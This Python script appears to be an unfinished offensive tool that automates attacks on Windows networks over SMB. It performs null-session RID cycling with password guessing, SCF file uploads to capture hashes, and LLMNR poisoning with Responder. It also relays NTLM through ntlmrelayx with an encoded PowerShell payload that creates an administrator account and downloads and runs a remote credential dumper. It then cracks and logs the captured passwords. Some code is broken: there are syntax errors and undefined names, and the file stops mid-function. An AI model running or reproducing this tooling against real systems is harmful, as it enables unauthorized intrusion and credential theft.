#!/usr/bin/env python3

import re
import os
import sys
import time
import string
import signal
import random
import asyncio
import argparse
import functools
import netifaces
from datetime import datetime
from itertools import zip_longest
from libnmap.process import NmapProcess
from asyncio.subprocess import PIPE, STDOUT
from netaddr import IPNetwork, AddrFormatError
from libnmap.parser import NmapParser, NmapParserException
from subprocess import Popen, PIPE, check_output, CalledProcessError
# Prevent JTR error in VMWare
os.environ['CPUID_DISABLE'] = '1'

# debug
from IPython import embed

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--hostlist", help="Host list file")
    parser.add_argument("-x", "--xml", help="Path to Nmap XML file")
    parser.add_argument("-p", "--password-list", help="Path to password list file")
    parser.add_argument("-s", "--skip", default='', help="Skip [rid/scf/responder/ntlmrelay/crack] where the first 4 options correspond to attacks 1-4")
    parser.add_argument("-r", "--respondertime", default='10', help="Number of minutes to run the LLMNR/Responder attack; defaults to 10m")
    return parser.parse_args()

def parse_nmap(args):
    '''
    Either performs an Nmap scan or parses an Nmap xml file
    Will either return the parsed report or exit script
    '''
    if args.xml:
        try:
            report = NmapParser.parse_fromfile(args.xml)
        except FileNotFoundError:
            sys.exit('[-] Host file not found: {}'.format(args.xml))
    elif args.hostlist:
        hosts = []
        with open(args.hostlist, 'r') as hostlist:
            host_lines = hostlist.readlines()
            for line in host_lines:
                line = line.strip()
                try:
                    if '/' in line:
                        hosts += [str(ip) for ip in IPNetwork(line)]
                    elif '*' in line:
                        sys.exit('[-] CIDR notation only in the host list e.g. 10.0.0.0/24')
                    else:
                        hosts.append(line)
                except (OSError, AddrFormatError):
                    sys.exit('[-] Error importing host list file. Are you sure you chose the right file?')
        report = nmap_scan(hosts)
    else:
        print('[-] Use the "-x [path/to/nmap-output.xml]" option if you already have an Nmap XML file \
or "-l [hostlist.txt]" option to run an Nmap scan with a hostlist file.')
        sys.exit()
    return report

def nmap_scan(hosts):
    '''
    Do Nmap scan
    '''
    nmap_args = '-sS --script smb-security-mode,smb-enum-shares -n --max-retries 5 -p 445 -oA smb-scan'
    nmap_proc = NmapProcess(targets=hosts, options=nmap_args, safe_mode=False)
    rc = nmap_proc.sudo_run_background()
    nmap_status_printer(nmap_proc)
    report = NmapParser.parse_fromfile(os.getcwd()+'/smb-scan.xml')

    return report

def nmap_status_printer(nmap_proc):
    '''
    Prints that Nmap is running
    '''
    i = -1
    x = -.5
    while nmap_proc.is_running():
        i += 1
        # Every 30 seconds print that Nmap is still running
        if i % 30 == 0:
            x += .5
            print("[*] Nmap running: {} min".format(str(x)))
        time.sleep(1)

def run_nse_scripts(args, hosts, nse_scripts_run):
    '''
    Run NSE scripts if they weren't run in supplied Nmap XML file
    '''
    hosts = []
    if nse_scripts_run == False:
        if len(hosts) > 0:
            print("[*] Running missing NSE scripts")
            report = nmap_scan(hosts)
            hosts = get_hosts(args, report)
            return hosts

def get_share(l, share):
    '''
    Gets the share from Nmap output line
    e.g., \\\\192.168.1.10\\Pictures
    '''
    if l.startswith('  \\\\') and '$' not in l:
        share = l.strip()[:-1]
    return share

def parse_nse(hosts, args):
    '''
    Parse NSE script output
    '''
    smb_signing_disabled_hosts = []

    if 'scf' not in args.skip.lower():
        print('\n[*] Attack 2: SCF file upload to anonymously writeable shares for hash collection')

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                if 'message_signing: disabled' in script_out['output']:
                    smb_signing_disabled_hosts.append(ip)

            # ATTACK 2: SCF file upload for hash capture
            if 'scf' not in args.skip.lower():
                if script_out['id'] == 'smb-enum-shares':
                    lines = script_out['output'].splitlines()
                    anon_share_found = write_scf_files(lines, ip, args)
                    local_scf_cleanup()

    if 'scf' not in args.skip.lower():
        if anon_share_found == False:
            print('[-] No anonymously writeable shares found')

    if len(smb_signing_disabled_hosts) > 0:
        for host in smb_signing_disabled_hosts:
            write_to_file('smb-signing-disabled-hosts.txt', host+'\n', 'a+')

def run_smbclient(server, share_name, action, scf_filepath):
    '''
    Run's impacket's smbclient.py for scf file attack
    '''
    smb_cmds_filename = 'smb-cmds.txt'
    smb_cmds_data = 'use {}\n{} {}\nls\nexit'.format(share_name, action, scf_filepath)
    write_to_file(smb_cmds_filename, smb_cmds_data, 'w+')
    smbclient_cmd = 'python2 submodules/impacket/examples/smbclient.py {} -f {}'.format(server, smb_cmds_filename)
    print("[*] Running '{}' with the verb '{}'".format(smbclient_cmd, action))
    stdout, stderr = Popen(smbclient_cmd.split(), stdout=PIPE, stderr=PIPE).communicate()
    return stdout, stderr

def write_scf_files(lines, ip, args):
    '''
    Writes SCF files to writeable shares based on Nmap smb-enum-shares output
    '''
    share = None
    anon_share_found = False
    scf_filepath = create_scf()

    for l in lines:
        share = get_share(l, share)
        if share:
            share_folder = share.split('\\')[-1]
            if 'Anonymous access:' in l or 'Current user access:' in l:
                access = l.split()[-1]
                if access == 'READ/WRITE':
                    anon_share_found = True
                    print('[+] Writeable share found at: '+share)
                    print('[*] Attempting to write SCF file to share')
                    action = 'put'
                    stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)
                    stdout = stdout.decode('utf-8')
                    if 'Error:' not in stdout and len(stdout) > 1:
                        print('[+] Successfully wrote SCF file to: {}'.format(share))
                        write_to_file('logs/shares-with-SCF.txt', share+'\n', 'a+')
                    else:
                        stdout_lines = stdout.splitlines()
                        for line in stdout_lines:
                            if 'Error:' in line:
                                print('[-] Error writing SCF file: \n    '+line.strip())
    
    return anon_share_found

def create_scf():
    '''
    Creates scf file and smbclient.py commands file
    '''
    scf_filename = '@local.scf'

    if not os.path.isfile(scf_filename):
        scf_data = '[Shell]\r\nCommand=2\r\nIconFile=\\\\{}\\file.ico\r\n[Taskbar]\r\nCommand=ToggleDesktop'.format(get_ip())
        write_to_file(scf_filename, scf_data, 'w+')

    cwd = os.getcwd()+'/'
    scf_filepath = cwd+scf_filename

    return scf_filepath

def local_scf_cleanup():
    '''
    Removes local SCF file and SMB commands file
    '''
    timestamp = str(time.time())
    scf_file = '@local.scf'
    smb_cmds_file = 'smb-cmds.txt'
    shares_file = 'logs/shares-with-SCF.txt'

    if os.path.isfile(scf_file):
        os.remove('@local.scf')

    if os.path.isfile(smb_cmds_file):
        os.remove('smb-cmds.txt')

    if os.path.isfile(shares_file):
        os.rename(shares_file, shares_file+'-'+timestamp)

def get_hosts(args, report):
    '''
    Gets list of hosts with port 445 open
    and a list of hosts with smb signing disabled
    '''
    hosts = []

    print('[*] Parsing hosts')
    for host in report.hosts:
        if host.is_up():
            # Get open services
            for s in host.services:
                if s.port == 445:
                    if s.state == 'open':
                        hosts.append(host)
    if len(hosts) == 0:
        sys.exit('[-] No hosts with port 445 open')

    return hosts

def coros_pool(worker_count, commands):
    '''
    A pool without a pool library
    '''
    coros = []
    if len(commands) > 0:
        while len(commands) > 0:
            for i in range(worker_count):
                # Prevents crash if [commands] isn't divisible by 5
                if len(commands) > 0:
                    coros.append(get_output(commands.pop()))
                else:
                    return coros
    return coros

@asyncio.coroutine
def get_output(cmd):
    '''
    Performs async OS commands
    '''
    p = yield from asyncio.create_subprocess_shell(cmd, stdout=PIPE, stderr=PIPE)
    # Output returns in byte string so we decode to utf8
    return (yield from p.communicate())[0].decode('utf8')

def async_get_outputs(loop, commands):
    '''
    Asynchronously run commands and get get their output in a list
    '''
    output = []

    if len(commands) == 0:
        return output

    # Get commands output in parallel
    worker_count = len(commands)
    if worker_count > 10:
        worker_count = 10

    # Create pool of coroutines
    coros = coros_pool(worker_count, commands)

    # Run the pool of coroutines
    if len(coros) > 0:
        output += loop.run_until_complete(asyncio.gather(*coros))

    return output

def create_cmds(hosts, cmd):
    '''
    Creates the list of comands to run
    cmd looks likes "echo {} && rpcclient ... {}"
    '''
    commands = []
    for host in hosts:
        # Most of the time host will be Nmap object but in case of null_sess_hosts
        # it will be a list of strings (ips)
        if type(host) is str:
            ip = host
        else:
            ip = host.address
        formatted_cmd = 'echo {} && '.format(ip) + cmd.format(ip)
        commands.append(formatted_cmd)
    return commands

def get_null_sess_hosts(output):
    '''
    Gets a list of all hosts vulnerable to SMB null sessions
    '''
    null_sess_hosts = {}
    # output is a list of rpcclient output
    for out in output:
        if 'Domain Name:' in out:
            out = out.splitlines()
            ip = out[0]
                         # Just get domain name
            dom = out[1].split()[2]
                         # Just get domain SID
            dom_sid = out[2].split()[2]
            null_sess_hosts[ip] = (dom, dom_sid)

    return null_sess_hosts

def print_domains(null_sess_hosts):
    '''
    Prints the unique domains
    '''
    uniq_doms = []
    for key,val in null_sess_hosts.items():
        dom_name = val[0]
        if dom_name not in uniq_doms:
            uniq_doms.append(dom_name)

    if len(uniq_doms) > 0:
        for d in uniq_doms:
            print('[+] Domain found: ' + d) 

def get_usernames(ridenum_output):
    ip_users = {}
    for host in ridenum_output:
        out_lines = host.splitlines()
        ip = out_lines[0]
        for line in out_lines:
                                          # No machine accounts
            if 'Account name:' in line and "$" not in line:
                user = line.split()[2]
                if ip in ip_users:
                    ip_users[ip] += [user]
                else:
                    ip_users[ip] = [user]

    return ip_users

def write_to_file(filename, data, write_type):
    '''
    Write data to disk
    '''
    with open(filename, write_type) as f:
        f.write(data)

def create_brute_cmds(ip_users, passwords):
    '''
    Creates the bruteforce commands
    ip_users = {ip:[user1,user2,user3]}
    '''
    already_tested = []
    cmds = []

    for ip in ip_users:
        for user in ip_users[ip]:
            if user not in already_tested:
                already_tested.append(user)
                print('[+] User found: ' + user)
                rpc_user_pass = []
                for pw in passwords:
                    cmd = "echo {} && rpcclient -U \"{}%{}\" {} -c 'exit'".format(ip, user, pw, ip)
                    # This is so when you get the output from the coros
                    # you get the username and pw too
                    cmd2 = "echo '{}' ".format(cmd)+cmd
                    cmds.append(cmd2)

    return cmds

def create_passwords(args):
    '''
    Creates the passwords based on default AD requirements
    or user-defined values
    '''
    if args.password_list:
        with open(args.password_list, 'r') as f:
            # We have to be careful with .strip()
            # because password could contain a space
            passwords = [line.rstrip() for line in f]
    else:
        season_pw = create_season_pw()
        other_pw = "P@ssw0rd"
        passwords = [season_pw, other_pw]

    return passwords

def create_season_pw():
    '''
    Turn the date into the season + the year
    '''
    # Get the current day of the year
    doy = datetime.today().timetuple().tm_yday
    year = str(datetime.today().year)

    spring = range(80, 172)
    summer = range(172, 264)
    fall = range(264, 355)
    # winter = everything else

    if doy in spring:
        season = 'Spring'
    elif doy in summer:
        season = 'Summer'
    elif doy in fall:
        season = 'Fall'
    else:
        season = 'Winter'

    season_pw = season+year
    return season_pw

def parse_brute_output(brute_output):
    '''
    Parse the chunk of rpcclient attempted logins
    '''
    # prev_creds = ['ip\user:password', 'dom\user:password']
    prev_creds = []
    pw_found = False

    for line in brute_output:
        # Missing second line of output means we have a hit
        if len(line.splitlines()) == 1:
            pw_found = True
            split = line.split()
            ip = split[1]
            dom_user_pwd = split[5].replace('"','').replace('%',':')
            prev_creds.append(dom_user_pwd)
            host_dom_user_pwd = ip+': '+dom_user_pwd

            duplicate = check_found_passwords(dom_user_pwd)
            if duplicate == False:
                print('[!] Password found! '+dom_user_pwd)
                log_pwds([dom_user_pwd])

    if pw_found == False:
        print('[-] No password matches found')

    return prev_creds

def smb_reverse_brute(loop, hosts, args, passwords):
    '''
    Performs SMB reverse brute
    '''
    # {ip:'domain name: xxx', 'domain sid: xxx'}
    null_sess_hosts = {}
    dom_cmd = 'rpcclient -U "" {} -N -c "lsaquery"'
    dom_cmds = create_cmds(hosts, dom_cmd)
    print('\n[*] Attack 1: RID cycling in null SMB sessions into reverse bruteforce')
    print('[*] Checking for null SMB sessions')
    print('[*] Example command that will run: '+dom_cmds[0].split('&& ')[1])
    rpc_output = async_get_outputs(loop, dom_cmds)

    if rpc_output == None:
        print('[-] Error attempting to look up null SMB sessions')
        return

    # {ip:'domain_name', 'domain_sid'}
    chunk_null_sess_hosts = get_null_sess_hosts(rpc_output)

    # Create master list of null session hosts
    null_sess_hosts.update(chunk_null_sess_hosts)
    if len(null_sess_hosts) == 0:
        print('[-] No null SMB sessions available')
        return
    else:
        null_hosts = []
        for ip in null_sess_hosts:
            print('[+] Null session found: {}'.format(ip))
            null_hosts.append(ip)
    print_domains(null_sess_hosts)

    # Gather usernames using ridenum.py
    print('[*] Checking for usernames. This may take a bit...')
    ridenum_cmd = 'python2 submodules/ridenum/ridenum.py {} 500 50000 | tee -a logs/ridenum.log'
    ridenum_cmds = create_cmds(null_hosts, ridenum_cmd)
    print('[*] Example command that will run: '+ridenum_cmds[0].split('&& ')[1])
    ridenum_output = async_get_outputs(loop, ridenum_cmds)
    if len(ridenum_output) == 0:
        print('[-] No usernames found')
        return

    # {ip:username, username2], ip2:[username, username2]}
    ip_users = get_usernames(ridenum_output)

    # Creates a list of unique commands which only tests
    # each username/password combo 2 times and not more
    brute_cmds = create_brute_cmds(ip_users, passwords)
    print('[*] Checking the passwords {} and {} against the users'.format(passwords[0], passwords[1]))
    brute_output = async_get_outputs(loop, brute_cmds)

    # Will always return at least an empty dict()
    prev_creds = parse_brute_output(brute_output)

    return prev_creds

def log_pwds(host_user_pwds):
    '''
    Turns SMB password data {ip:[usrr_pw, user2_pw]} into a string
    '''
    for host_user_pwd in host_user_pwds:
        line = host_user_pwd+'\n'
        write_to_file('found-passwords.txt', line, 'a+')

def edit_responder_conf(switch, protocols):
    '''
    Edit responder.conf
    '''
    if switch == 'On':
        opp_switch = 'Off'
    else:
        opp_switch = 'On'
    conf = 'submodules/Responder/Responder.conf'
    with open(conf, 'r') as f:
        filedata = f.read()
    for p in protocols:
        # Make sure the change we're making is necessary
        if re.search(p+' = '+opp_switch, filedata):
            filedata = filedata.replace(p+' = '+opp_switch, p+' = '+switch)
    with open(conf, 'w') as f:
        f.write(filedata)

def get_iface():
    '''
    Gets the right interface for Responder
    '''
    ifaces = []
    for iface in netifaces.interfaces():
    # list of ipv4 addrinfo dicts
        ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
        for entry in ipv4s:
            addr = entry.get('addr')
            if not addr:
                continue
            if not (iface.startswith('lo') or addr.startswith('127.')):
                ifaces.append(iface)

    # Probably will only find 1 interface, but in case of more just use the first one
    return ifaces[0]

def get_ip():
    iface = get_iface()
    ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    return ip

def run_proc(cmd):
    '''
    Runs single commands
    ntlmrelayx needs the -c "powershell ... ..." cmd to be one arg tho
    '''

    # Set up ntlmrelayx commands
    # only ntlmrelayx has a " in it
    dquote_split = cmd.split('"')
    if len(dquote_split) > 1:
        cmd_split = dquote_split[0].split()
        ntlmrelayx_remote_cmd = dquote_split[1]
        cmd_split.append(ntlmrelayx_remote_cmd)
    else:
        cmd_split = cmd.split()

    for x in cmd_split:
        if 'submodules/' in x:
            filename = x.split('/')[-1] + '.log'
            break
    print('[*] Running: {}'.format(cmd))
    f = open('logs/'+filename, 'a+')
    proc = Popen(cmd_split, stdout=f, stderr=STDOUT)
    return proc

def get_resp_hashes(prev_creds):
    '''
    Checks the responder log folder for hashes found
    '''
    logdir_path = os.getcwd()+'/submodules/Responder/logs'
    resp_log_files = os.listdir(logdir_path)
    hashes = {}
    for f in resp_log_files:
        if '-NTLM' in f:
            hash_path = logdir_path+'/'+f
            ntlm_hash = open(hash_path, 'r').read()
            if hash_path not in prev_creds:
                # Do hash_path instead of actual hash to prevent dupes
                prev_creds.append(hash_path)
                print('[!] Hash found! '+ f)
                if 'NTLMv1' in f:
                    if 'NTLMv1' in hashes:
                        hashes['NTLMv1'] += [ntlm_hash]
                    else:
                        hashes['NTLMv1'] = [ntlm_hash]
                elif 'NTLMv2' in f:
                    if 'NTLMv2' in hashes:
                        hashes['NTLMv2'] += [ntlm_hash]
                    else:
                        hashes['NTLMv2'] = [ntlm_hash]

    return prev_creds, hashes

def create_john_cmd(hash_format, hash_file):
    '''
    Create JohnTheRipper command
    '''
    #./john --format=<format> --wordlist=<path> --rules <hashfile>
    cmd = []
    path = 'submodules/JohnTheRipper/run/john'
    cmd.append(path)
    form = '--format={}'.format(hash_format)
    cmd.append(form)
    wordlist = '--wordlist=submodules/10_million_password_list_top_1000000.txt'
    cmd.append(wordlist)
    cmd.append('--rules')
    cmd.append(hash_file)
    john_cmd = ' '.join(cmd)
    return john_cmd

def crack_hashes(hashes, identifier):
    '''
    Crack hashes with john
    The hashes in the func args include usernames, domains, and such
    '''
    procs = []

    if len(hashes) > 0:
        # hashes = {'NTLMv1':['user:DOM:host:hash'], 'NTLMv2':['user:DOM:host:hash']}
        for hash_type in hashes:
            filename = '{}-hashes-{}.txt'.format(hash_type, identifier)
            for h in hashes[hash_type]:
                write_to_file(filename, h, 'a+')
            if 'v1' in hash_type:
                hash_format = 'netntlm'
            elif 'v2' in hash_type:
                hash_format = 'netntlmv2'
            john_cmd = create_john_cmd(hash_format, filename)
            try:
                john_proc = run_proc(john_cmd)
            except FileNotFoundError:
                print('[-] Error running john for password cracking, \
                       try: cd submodules/JohnTheRipper/src && ./configure && make')
            procs.append(john_proc)

    return procs

def get_cracked_pwds(prev_creds):
    '''
    Check for new cracked passwords
    '''
    dir_contents = os.listdir(os.getcwd())
    for x in dir_contents:
        if re.search('NTLMv(1|2)-hashes-.*\.txt', x):
            out = check_output('submodules/JohnTheRipper/run/john --show {}'.format(x).split())
            for line in out.splitlines():
                line = line.decode('utf8')
                line = line.split(':')
                if len(line) > 3:
                    user = line[0]
                    pw = line[1]
                    host = line[2]
                    host_user_pwd = host+'\\'+user+':'+pw
                    if host_user_pwd not in prev_creds:
                        prev_creds.append(host_user_pwd)
                        duplicate = check_found_passwords(host_user_pwd)
                        if duplicate == False:
                            print('[!] Password found! '+host_user_pwd)
                            log_pwds([host_user_pwd])
    return prev_creds

def check_found_passwords(host_user_pwd):
    '''
    Checks found-passwords.txt to prevent duplication
    '''
    fname = 'found-passwords.txt'
    if os.path.isfile(fname):
        with open(fname, 'r') as f:
            data = f.read()
            if host_user_pwd in data:
                return True

    return False

def start_responder_llmnr():
    '''
    Start Responder alone for LLMNR attack
    '''
    edit_responder_conf('On', ['HTTP', 'SMB'])
    iface = get_iface()
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)
    print('[*] Responder-Session.log:')
    return resp_proc

def run_relay_attack():
    '''
    Start ntlmrelayx for ntlm relaying
    '''
    iface = get_iface()
    edit_responder_conf('Off', ['HTTP', 'SMB'])
    resp_cmd = 'python2 submodules/Responder/Responder.py -wrd -I {}'.format(iface)
    resp_proc = run_proc(resp_cmd)

# net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
    relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py'
                ' -of ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
                ' -c "powershell -nop -exec bypass -w hidden -enc '
                'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
    ntlmrelay_proc = run_proc(relay_cmd)
    return resp_proc, ntlmrelay_proc

def follow_file(thefile):
    '''
    Works like tail -f
    Follows a constantly updating file
    '''
    thefile.seek(0,2)
    while True:
        line = thefile.readline()
        if not line:
            time.sleep(0.1)
            continue
        yield line

def check_ntlmrelay_error(line, file_lines):
    '''
    Checks for ntlmrelay errors
    '''
    if 'Traceback (most recent call last):' in line:
        print('[-] Error running ntlmrelayx:\n')
        for l in file_lines:
            print(l.strip())
        print('\n[-] Hit CTRL-C to quit')
        return True
    else:
        return False

def format_mimi_data(dom, user, auth, hash_or_pw, prev_creds):
    '''
    Formats the collected mimikatz data and logs it
    '''
    dom_user_pwd = dom+'\\'+user+':'+auth

    if dom_user_pwd not in prev_creds:
        prev_creds.append(dom_user_pwd)
        duplicate = check_found_passwords(dom_user_pwd)
        if duplicate == False:
            print('[!] {} found! {}'.format(hash_or_pw, dom_user_pwd))
            log_pwds([dom_user_pwd])

    return prev_creds

def parse_mimikatz(prev_creds, mimi_data, line):
    '''
    Parses mimikatz output for usernames and passwords
    '''
    splitl = line.split(':')
    user = None
    dom = None
    ntlm = None

    if "* Username" in line:
        if mimi_data['user']:
            user = mimi_data['user']
            if user != '(null)' and mimi_data['dom']:
                dom = mimi_data['dom']
                # Prevent (null) and hex passwords from being stored
                if mimi_data['pw']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['pw'], 'Password', prev_creds)
                elif mimi_data['ntlm']:
                    prev_creds = format_mimi_data(dom, user, mimi_data['ntlm'], 'Hash', prev_creds)

        user = splitl[-1].strip()
        if user != '(null)':
            mimi_data['user'] = user
        mimi_data['dom'] = None
        mimi_data['ntlm'] = None
        mimi_data['pw'] = None
    elif "* Domain" in line:
        mimi_data['dom'] = splitl[-1].strip()
    elif "* NTLM" in line:
        ntlm = splitl[-1].strip()
        if ntlm != '(null)':
            mimi_data['ntlm'] = splitl[-1].strip()
    elif "* Password" in line:
        pw = splitl[-1].strip()
        if pw != '(null)' and pw.count(' ') < 15:
            mimi_data['pw'] = splitl[-1].strip()

    return prev_creds, mimi_data

def get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier):
    '''
    Gets and cracks responder hashes
    Avoids getting and cracking previous hashes
    '''
    new_lines = []
    ip = None

    if 'crack' not in args.skip.lower():
        prev_creds, hashes = get_resp_hashes(prev_creds)
        john_proc = crack_hashes(hashes, identifier)
        prev_creds = get_cracked_pwds(prev_creds)

    # Print responder-session.log output so we know it's running
    path = 'submodules/Responder/logs/Responder-Session.log'
    if os.path.isfile(path):
        with open(path, 'r') as f:
            contents = f.readlines()
            for line in contents:
                if line not in prev_lines:
                    new_lines.append(line)
                    line = line.strip()
                    print('    [Responder] '+line
                    ip = parse_responder_lines(client_found, line)

    # We don't want a separate john proc for each hash so we wait 10s between checks
    time.sleep(10)

    return prev_creds, new_lines

def parse_responder(client_found, line):
    '''
    Parse responder to get usernames and IPs for 2 pw bruteforcing
    '''
    client_id = ' Client   : '
    username_id = ' Username : '

    if client_found == True:
        if username_id in line:
            client_found = False
            username = line.split(username_id)[-1].strip()
            # DO BRUTE HERE
        else:
            print('[-] Error parsing Responder-Session.log: why is client_found == True but this line is not " Username : "??')

    if client in line:
        ip = line.split(client_id)[-1].strip()

    return ip

def cleanup_resp(resp_proc, prev_creds):
    '''
    Kill responder and move the log file
    '''
    resp_proc.kill()
    path = 'submodules/Responder/logs/Responder-Session.log'
    timestamp = str(time.time())
    os.rename(path, path+'-'+timestamp)
    prev_creds = get_cracked_pwds(prev_creds)
    return prev_creds

def parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args):
    '''
    Parses ntlmrelayx.py's output
    '''
    hashes = {}
    # check for errors
    if line.startswith('  ') or line.startswith('Traceback') or line.startswith('ERROR'):
        # First few lines of mimikatz logo start with '   ' and have #### in them
        if '####' not in line and 'mimikatz_initOrClean ; CoInitializeEx' not in line:
            print('    '+line.strip())

    # ntlmrelayx output
    if re.search('\[.\]', line):
        print('    '+line.strip())

    # Only try to crack successful auth hashes
    if successful_auth == True:
        successful_auth = False
        netntlm_hash = line.split()[-1]+'\n'

        if netntlm_hash.count(':') == 5:
            hash_type = 'NTLMv2'
            if netntlm_hash not in prev_creds:
                prev_creds.append(netntlm_hash)
                hashes['NTLMv2'] = [netntlm_hash]

        if netntlm_hash.count(':') == 4:
            hash_type = 'NTLMv1'
            if netntlm_hash not in prev_creds:
                prev_creds.append(netntlm_hash)
                hashes['NTLMv1'] = [netntlm_hash]

        if len(hashes) > 0:
            if 'crack' not in args.skip.lower():
                john_procs = crack_hashes(hashes, identifier)

    if successful_auth == False:
        if ' SUCCEED' in line:
            successful_auth = True

    if 'Executed specified command on host' in line:
        ip = line.split()[-1]
        host_user_pwd = ip+'\\icebreaker:P@ssword123456'
        prev_creds.append(host_user_pwd)
        duplicate = check_found_passwords(host_user_pwd)
        if duplicate == False:
            print('[!] User created! '+host_user_pwd)
            log_pwds([host_user_pwd])

    return prev_creds, successful_auth

def do_ntlmrelay(identifier, prev_creds, args):
    '''
    Continuously monitor and parse ntlmrelay output
    '''
    print('\n[*] Attack 4: NTLM relay with Responder and ntlmrelayx')
    resp_proc, ntlmrelay_proc = run_relay_attack()

    ########## CTRL-C HANDLER ##############################
    def signal_handler(signal, frame):
        '''
        Catch CTRL-C and kill procs
        '''
        print('\n[-] CTRL-C caught, cleaning up and closing')

        # Kill procs
        cleanup_resp(resp_proc, prev_creds)
        ntlmrelay_proc.kill()

        # Cleanup hash files
        cleanup_hash_files()

        # Clean up SCF file
        remote_scf_cleanup()

        sys.exit()

    signal.signal(signal.SIGINT, signal_handler)
    ########## CTRL-C HANDLER ##############################

    mimi_data = {'dom':None, 'user':None, 'ntlm':None, 'pw':None}
    print('[*] ntlmrelayx.py output:')
    ntlmrelay_file = open('logs/ntlmrelayx.py.log', 'r')
    file_lines = follow_file(ntlmrelay_file)
    successful_auth = False
    for line in file_lines:
        # Parse ntlmrelay output
        prev_creds, successful_auth = parse_ntlmrelay_line(identifier, line, successful_auth, prev_creds, args)
        # Parse mimikatz output
        prev_creds, mimi_data = parse_mimikatz(prev_creds, mimi_data, line)

def check_for_nse_scripts(hosts):
    '''
    Checks if both NSE scripts were run
    '''
    sec_run = False
    enum_run = False

    for host in hosts:
        ip = host.address

        # Get SMB signing data
        for script_out in host.scripts_results:
            if script_out['id'] == 'smb-security-mode':
                sec_run = True

            if script_out['id'] == 'smb-enum-shares':
                enum_run = True

    if sec_run == False or enum_run == False:
        return False
    else:
        return True

def remote_scf_cleanup():
    '''
    Deletes the scf file from the remote shares
    '''
    path = 'logs/shares-with-SCF.txt'
    if os.path.isfile(path):
        with open(path) as f:
            lines = f.readlines()
            for l in lines:
                # Returns '['', '', '10.1.1.0', 'path/to/share\n']
                split_line = l.split('\\', 3)
                ip = split_line[2]
                share_folder = split_line[3].strip()
                action = 'rm'
                scf_filepath = '@local.scf'
                stdout, stderr = run_smbclient(ip, share_folder, action, scf_filepath)

def cleanup_hash_files():
    '''
    Puts all the hash files of each type into one file
    '''
    ntlm_files = []
    for fname in os.listdir(os.getcwd()):
        if re.search('NTLMv(1|2)-hashes-.*\.txt', fname):
            ntlm_files.append(fname)

    for fname in os.listdir(os.getcwd()+'/submodules/Responder/logs'):
        if re.search('v(1|2).*\.txt', fname):
            ntlm_files.append(fname)

    for fname in ntlm_files:
        try:
            if 'v1' in fname:
                with open(fname) as infile1:
                    v1_file = open('NTLMv1-hashes.txt', 'a+')
                    v1_file.write(infile1.read())
                    os.rename(fname, 'logs/'+fname)
            elif 'v2' in fname:
                with open(fname) as infile2:
                    v2_file = open('NTLMv2-hashes.txt', 'a+')
                    v2_file.write(infile2.read())
                    os.rename(fname, 'logs/'+fname)
        except:
            continue


def main(report, args):
    '''
    Performs:
        SCF file upload for hash collection
        SMB reverse bruteforce
        Responder LLMNR poisoning
        SMB relay
        Hash cracking
    '''
    prev_creds = []
    prev_creds = []
    loop = asyncio.get_event_loop()
    passwords = create_passwords(args)
    identifier = ''.join(random.choice(string.ascii_letters) for x in range(5))

    # Returns a list of Nmap object hosts
    # So you must use host.address, for example, to get the ip
    hosts = get_hosts(args, report)

    if len(hosts) > 0:
        nse_scripts_run = check_for_nse_scripts(hosts)

        # If Nmap XML shows that one or both NSE scripts weren't run, do it now
        if nse_scripts_run == False:
            hosts = run_nse_scripts(args, hosts)

        for h in hosts:
            print('[+] SMB open: {}'.format(h.address))

        # ATTACK 1: RID Cycling into reverse bruteforce
        if 'rid' not in args.skip.lower():
            prev_creds += smb_reverse_brute(loop, hosts, args, passwords)

        # ATTACK 2: SCF file upload to writeable shares
        parse_nse(hosts, args)

    else:
        print('[-] No hosts with port 445 open. \
                   Skipping all attacks except LLMNR/NBNS/mDNS poison attack with Responder.py')

    # ATTACK 3: LLMNR poisoning
    if 'llmnr' not in args.skip.lower():
        print('\n[*] Attack 3: LLMNR/NBTS/mDNS poisoning for NTLM hashes')
        prev_lines = []
        resp_proc = start_responder_llmnr()
        time.sleep(2)

        # Check for hashes for set amount of time
        timeout = time.time() + 60 * int(args.respondertime)
        try:
            while time.time() < timeout:
                prev_creds, new_lines = get_and_crack_resp_hashes(args, prev_creds, prev_lines, identifier)
                prev_lines += new_lines
            prev_creds = cleanup_resp(resp_proc, prev_creds)
        except KeyboardInterrupt:
            print('\n[-] Killing Responder.py and moving on')
            prev_creds = cleanup_resp(resp_proc, prev_creds)
            # Give responder some time to die with dignity
            time.sleep(2)

    # ATTACK 4: NTLM relay
    if 'relay' not in args.skip.lower() and len(hosts) > 0:
